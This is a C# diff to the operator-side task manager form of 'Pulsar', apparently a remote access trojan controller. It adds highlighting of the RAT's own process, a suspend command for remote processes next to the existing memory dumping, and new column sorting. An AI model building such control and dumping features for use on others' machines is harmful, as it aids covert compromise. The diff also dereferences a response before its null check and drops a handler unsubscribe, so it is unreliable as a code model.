@@ -9,6 +9,7 @@ using Pulsar.Server.Messages;
 using Pulsar.Server.Networking;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Windows.Forms;
 
 namespace Pulsar.Server.Forms
@@ -31,6 +32,8 @@ namespace Pulsar.Server.Forms
         private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new Dictionary<Client, FrmTaskManager>();
 
         private List<FrmMemoryDump> _memoryDumps = new List<FrmMemoryDump>();
+
+        private int? _ratPid = null;
 
         /// <summary>
         /// Creates a new task manager form for the client or gets the current open form, if there exists one already.
@@ -73,7 +76,20 @@ namespace Pulsar.Server.Forms
         private void RegisterMessageHandler()
         {
             _connectClient.ClientState += ClientDisconnected;
-            _taskManagerHandler.ProgressChanged += TasksChanged;
+            _taskManagerHandler.ProgressChanged += (s, processes) =>
+            {
+                Debug.WriteLine(_taskManagerHandler.LastProcessesResponse.RatPid);
+
+                if (_taskManagerHandler.LastProcessesResponse != null)
+                {
+                    TasksChanged(s, processes, _taskManagerHandler.LastProcessesResponse.RatPid);
+
+                }
+                else
+                {
+                    TasksChanged(s, processes, null);
+                }
+            };
             _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
             _taskManagerHandler.OnResponseReceived += CreateMemoryDump;
             MessageHandler.Register(_taskManagerHandler);
@@ -87,7 +103,7 @@ namespace Pulsar.Server.Forms
             MessageHandler.Unregister(_taskManagerHandler);
             _taskManagerHandler.OnResponseReceived -= CreateMemoryDump;
             _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
-            _taskManagerHandler.ProgressChanged -= TasksChanged;
+
             _connectClient.ClientState -= ClientDisconnected;
         }
 
@@ -104,7 +120,7 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void TasksChanged(object sender, Process[] processes)
+        private void TasksChanged(object sender, Common.Models.Process[] processes)
         {
             lstTasks.Items.Clear();
 
@@ -116,6 +132,13 @@ namespace Pulsar.Server.Forms
             }
 
             processesToolStripStatusLabel.Text = $"Processes: {processes.Length}";
+            this.HighlightRatPid();
+        }
+
+        private void TasksChanged(object sender, Common.Models.Process[] processes, int? ratPid)
+        {
+            _ratPid = ratPid;
+            TasksChanged(sender, processes);
         }
 
         private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
@@ -167,16 +190,19 @@ namespace Pulsar.Server.Forms
             _taskManagerHandler.RefreshProcesses();
         }
 
-        private void lstTasks_ColumnClick(object sender, ColumnClickEventArgs e)
-        {
-            lstTasks.LvwColumnSorter.NeedNumberCompare = (e.Column == 1);
-        }
-
         private void dumpMemoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem lvi in lstTasks.SelectedItems)
             {
                 _taskManagerHandler.DumpProcess(int.Parse(lvi.SubItems[1].Text));
+            }
+        }
+
+        private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem lvi in lstTasks.SelectedItems)
+            {
+                _taskManagerHandler.SuspendProcess(int.Parse(lvi.SubItems[1].Text));
             }
         }
 
@@ -195,6 +221,61 @@ namespace Pulsar.Server.Forms
             {
                 string reason = response.FailureReason == "" ? "" : $"Reason: {response.FailureReason}";
                 MessageBox.Show($"Failed to dump process!\n{reason}", $"Failed to dump process ({response.Pid}) - {response.ProcessName}");
+            }
+        }
+
+        private void lstTasks_ColumnClick(object sender, ColumnClickEventArgs e)
+        {
+            if (lstTasks.Tag is Tuple<int, bool> lastSort && lastSort.Item1 == e.Column)
+            {
+                lstTasks.Tag = Tuple.Create(e.Column, !lastSort.Item2);
+            }
+            else
+            {
+                lstTasks.Tag = Tuple.Create(e.Column, true);
+            }
+            bool ascending = ((Tuple<int, bool>)lstTasks.Tag).Item2;
+
+            lstTasks.ListViewItemSorter = new ListViewItemComparer(e.Column, ascending);
+            lstTasks.Sort();
+        }
+
+        private class ListViewItemComparer : System.Collections.IComparer
+        {
+            private int col;
+            private bool ascending;
+            public ListViewItemComparer(int column, bool ascending)
+            {
+                this.col = column;
+                this.ascending = ascending;
+            }
+            public int Compare(object x, object y)
+            {
+                string a = ((ListViewItem)x).SubItems[col].Text;
+                string b = ((ListViewItem)y).SubItems[col].Text;
+                int result = string.Compare(a, b, StringComparison.CurrentCultureIgnoreCase);
+                return ascending ? result : -result;
+            }
+        }
+
+        private void HighlightRatPid()
+        {
+            if (_ratPid == null) return;
+            foreach (ListViewItem item in lstTasks.Items)
+            {
+                if (item.Tag == null)
+                    item.Tag = item.BackColor;
+
+                if (item.SubItems.Count > 1 && int.TryParse(item.SubItems[1].Text, out int pid) && pid == _ratPid)
+                {
+                    item.BackColor = System.Drawing.Color.LightGreen;
+                }
+                else
+                {
+                    // restore old color fr
+                    if (item.Tag is System.Drawing.Color originalColor)
+                        item.BackColor = originalColor;
+                }
             }
         }
     }
